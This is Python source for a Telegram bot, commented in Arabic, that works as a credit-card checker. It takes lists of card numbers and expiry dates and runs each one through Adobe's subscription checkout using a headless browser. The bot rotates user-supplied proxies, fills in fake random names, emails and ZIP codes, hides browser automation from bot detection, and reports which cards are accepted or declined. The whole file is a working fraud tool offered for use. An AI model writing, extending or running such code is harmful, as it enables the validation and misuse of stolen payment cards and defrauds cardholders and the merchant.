import asyncio
import os
import random
import string
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from playwright.async_api import async_playwright

BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    raise ValueError("⚠️ التوكن غير موجود! تأكد من إضافته في إعدادات Variables في Railway.")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# طابور المهام وقائمة البروكسيات
card_queue = asyncio.Queue()
proxy_list = []

# إعداد حالات البوت (FSM) لانتظار إدخال البروكسيات
class BotStates(StatesGroup):
    waiting_for_proxies = State()

ADOBE_URL = "https://commerce.adobe.com/store/checkout?items%5B0%5D%5Bid%5D=D0440AB0F2F7F2F2CB39657F45BC5D56&items%5B0%5D%5Bq%5D=1&cli=creative&co=US&lang=en"

def generate_random_data():
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin"]
    zip_codes = ["10001", "90210", "60601", "73301", "33101", "94105", "98101", "02108", "30301", "75201"]
    
    fname = random.choice(first_names)
    lname = random.choice(last_names)
    zip_code = random.choice(zip_codes)
    
    random_nums = ''.join(random.choices(string.digits, k=4))
    email = f"{fname.lower()}{lname.lower()}{random_nums}@gmail.com"
    
    return email, fname, lname, zip_code

async def automate_adobe_checkout(chat_id, data: dict):
    last_4 = data['card'][-4:]
    
    await bot.send_message(
        chat_id, 
        f"⏳ **جاري فحص البطاقة تنتهي بـ {last_4}**\n"
        f"📧 الإيميل: `{data['email']}`\n"
        f"👤 الاسم: {data['fname']} {data['lname']}",
        parse_mode="Markdown"
    )
    
    async with async_playwright() as p:
        proxy_settings = None
        
        # استخدام البروكسيات المضافة من الزر إذا كانت متوفرة
        if proxy_list:
            selected_proxy = random.choice(proxy_list)
            try:
                # تقسيم البروكسي: username:password@ip:port
                credentials, server_address = selected_proxy.split('@')
                p_user, p_pass = credentials.split(':')
                proxy_settings = {
                    "server": f"http://{server_address}",
                    "username": p_user,
                    "password": p_pass
                }
            except Exception as e:
                print(f"Error parsing proxy {selected_proxy}: {e}")
        # خيار بديل: استخدام متغيرات Railway إذا لم يتم إضافة بروكسيات عبر الزر
        elif os.getenv("PROXY_SERVER"):
            proxy_settings = {
                "server": os.getenv("PROXY_SERVER"),
                "username": os.getenv("PROXY_USERNAME"),
                "password": os.getenv("PROXY_PASSWORD")
            }

        browser = await p.chromium.launch(
            headless=True,
            args=[
                '--no-sandbox', 
                '--disable-setuid-sandbox', 
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled'
            ]
        )
        
        context = await browser.new_context(
            viewport={'width': 1440, 'height': 900},
            proxy=proxy_settings,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        page = await context.new_page()
        
        await page.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
        """)
        
        screenshot_path = f"result_{chat_id}_{last_4}.png"
        error_img = f"error_{chat_id}_{last_4}.png"
        
        try:
            await page.goto(ADOBE_URL, wait_until="domcontentloaded", timeout=60000)
            await page.locator('input[type="email"]').wait_for(state="visible", timeout=30000)

            await page.locator('input[type="email"]').type(data['email'], delay=random.randint(50, 150))
            await page.locator('button:has-text("Continue")').click()
            
            async def smart_type(hints, value):
                for _ in range(15):
                    frames_to_check = [page] + page.frames
                    for f in frames_to_check:
                        for hint in hints:
                            selector = f'input[name*="{hint}" i], input[placeholder*="{hint}" i], input[aria-label*="{hint}" i], input[id*="{hint}" i], input[data-fieldtype*="{hint}" i]'
                            loc = f.locator(selector)
                            count = await loc.count()
                            
                            for i in range(count):
                                target = loc.nth(i)
                                if await target.is_visible():
                                    try:
                                        try:
                                            await target.click(timeout=1000)
                                        except:
                                            await target.focus(timeout=1000)
                                            
                                        await target.fill("")
                                        await target.type(value, delay=random.randint(50, 150))
                                        return
                                    except:
                                        continue 
                    await page.wait_for_timeout(1000)
                raise Exception(f"لم يتم العثور على الحقل المرتبط بـ: {hints[0]}")

            await page.wait_for_timeout(3000)
            
            await smart_type(["cardnumber", "card number", "ccnumber", "encryptedcard", "credit"], data['card'])
            await smart_type(["expiry", "expiration", "mm/yy", "date", "encryptedexpiry"], data['expiry'])

            await smart_type(["first name", "firstname", "fname"], data['fname'])
            await smart_type(["last name", "lastname", "lname"], data['lname'])
            await smart_type(["zip", "postal", "postcode"], data['zip'])

            await page.mouse.wheel(0, 500)
            await page.wait_for_timeout(1000)
            
            await page.locator('button:has-text("Agree and subscribe")').click()
            
            await bot.send_message(chat_id, "🔄 جاري معالجة الدفع واستخراج النتيجة...")
            await page.wait_for_timeout(20000)
            
            page_text = await page.evaluate("document.body.innerText")
            
            if "not eligible for a free trial" in page_text.lower():
                status_result = "❌ **فشل:** غير مؤهل للتجربة المجانية (IP محظور أو تم كشف المحاولات)"
            elif "we couldn't process your payment" in page_text.lower():
                status_result = "❌ **فشل:** رفض البنك أو بوابة الدفع البطاقة (Card Declined / Dead)"
            elif "thank you" in page_text.lower() or "manage your account" in page_text.lower() or "order confirmation" in page_text.lower():
                status_result = "✅ **نجاح باهر!** تم قبول البطاقة واشتراك الحساب بنجاح!"
            else:
                status_result = "⚠️ **نتيجة غير جزمية:** يرجى فحص لقطة الشاشة أدناه لمعرفة التفاصيل."

            await page.screenshot(path=screenshot_path)
            photo = FSInputFile(screenshot_path)
            
            await bot.send_photo(
                chat_id, 
                photo, 
                caption=f"🎉 النتيجة النهائية للبطاقة {last_4}:\n\n{status_result}",
                parse_mode="Markdown"
            )
            
        except Exception as e:
            await page.screenshot(path=error_img)
            photo = FSInputFile(error_img)
            error_msg = str(e).split('\n')[0] 
            
            await bot.send_photo(
                chat_id, 
                photo, 
                caption=f"🎉 النتيجة النهائية للبطاقة {last_4}:\n\n❌ **فشل تقني:** حدث استثناء أثناء التنفيذ (`{error_msg}`)",
                parse_mode="Markdown"
            )
            
        finally:
            await browser.close()
            if os.path.exists(screenshot_path):
                os.remove(screenshot_path)
            if os.path.exists(error_img):
                os.remove(error_img)

async def queue_worker():
    while True:
        chat_id, user_data = await card_queue.get()
        try:
            await automate_adobe_checkout(chat_id, user_data)
        except Exception as e:
            print(f"Error processing card: {e}")
        finally:
            card_queue.task_done()
            await asyncio.sleep(3)

@dp.message(Command("start"))
async def send_welcome(message: Message):
    # إنشاء زر إضافة البروكسيات
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ اضافة بروكسيات", callback_data="add_proxies")]
    ])
    
    await message.reply(
        "مرحباً بك.\n"
        "أرسل لي بيانات الدفع بأي تنسيق وسأقوم بفلترتها وفحصها.\n\n"
        "يمكنك إرسال بطاقة واحدة، أو مجموعة بطاقات (كل بطاقة في سطر).\n\n"
        "أمثلة مدعومة:\n"
        "`4938 7506 7122 3872|0731`\n"
        "`4938750671223872|07|31|123`\n"
        "`4938750671223872|07/31|123`",
        parse_mode="Markdown",
        reply_markup=kb
    )

# معالجة الضغط على زر إضافة البروكسيات
@dp.callback_query(F.data == "add_proxies")
async def add_proxies_callback(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "أرسل البروكسيات الآن.\n"
        "يمكنك إرسال بروكسي واحد أو مجموعة مفصولة بمسافة أو في أسطر جديدة.\n\n"
        "**التنسيق المطلوب:**\n"
        "`username:password@ip:port`", 
        parse_mode="Markdown"
    )
    # إدخال البوت في حالة انتظار البروكسيات
    await state.set_state(BotStates.waiting_for_proxies)
    await callback.answer()

# معالجة رسالة البروكسيات (تعمل فقط عندما يكون البوت في حالة الانتظار)
@dp.message(BotStates.waiting_for_proxies)
async def receive_proxies(message: Message, state: FSMContext):
    text = message.text.strip()
    # تقسيم النص بناءً على المسافات أو الأسطر الجديدة
    raw_proxies = re.split(r'\s+', text)
    
    added_count = 0
    for rp in raw_proxies:
        # التأكد المبدئي من أن النص يحتوي على التنسيق الصحيح
        if '@' in rp and ':' in rp:
            proxy_list.append(rp)
            added_count += 1
            
    if added_count > 0:
        await message.reply(f"✅ تم إضافة **{added_count}** بروكسيات بنجاح!\nإجمالي البروكسيات المتوفرة في البوت الآن: **{len(proxy_list)}**", parse_mode="Markdown")
    else:
        await message.reply("⚠️ لم يتم العثور على بروكسيات بالتنسيق الصحيح. تأكد من التنسيق وحاول مجدداً.")
        
    # إخراج البوت من حالة الانتظار ليعود لاستقبال البطاقات
    await state.clear()

# معالجة بيانات البطاقات (تعمل في الوضع الطبيعي)
@dp.message()
async def process_data(message: Message):
    lines = message.text.strip().split('\n')
    added_count = 0
    
    for line in lines:
        if not line.strip(): 
            continue
            
        parts = line.split('|')
        if len(parts) < 2:
            continue
            
        card_clean = re.sub(r'\D', '', parts[0])
        part2 = re.sub(r'\D', '', parts[1])
        
        if len(part2) == 4:
            expiry_clean = part2
        elif len(part2) == 2 and len(parts) >= 3:
            part3 = re.sub(r'\D', '', parts[2])
            if len(part3) == 4: 
                expiry_clean = part2 + part3[-2:]
            elif len(part3) == 2: 
                expiry_clean = part2 + part3
            else:
                expiry_clean = part2 
        else:
            expiry_clean = part2
            
        if len(card_clean) < 13 or len(expiry_clean) < 4:
            continue
            
        rand_email, rand_fname, rand_lname, rand_zip = generate_random_data()
        
        user_data = {
            'email': rand_email,
            'card': card_clean,
            'expiry': expiry_clean[:4],
            'fname': rand_fname,
            'lname': rand_lname,
            'zip': rand_zip
        }
        
        await card_queue.put((message.chat.id, user_data))
        added_count += 1
        
    if added_count > 0:
        await message.reply(f"✅ تم بنجاح إضافة **{added_count}** بطاقة إلى الطابور.\nسيتم الفحص واحدة تلو الأخرى.", parse_mode="Markdown")
    else:
        # رسالة الخطأ تظهر فقط إذا لم نكن في وضع إرسال البروكسيات
        await message.reply("⚠️ لم يتم العثور على بطاقات بتنسيق صحيح في رسالتك.")

async def main():
    print("Bot is starting...")
    asyncio.create_task(queue_worker())
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
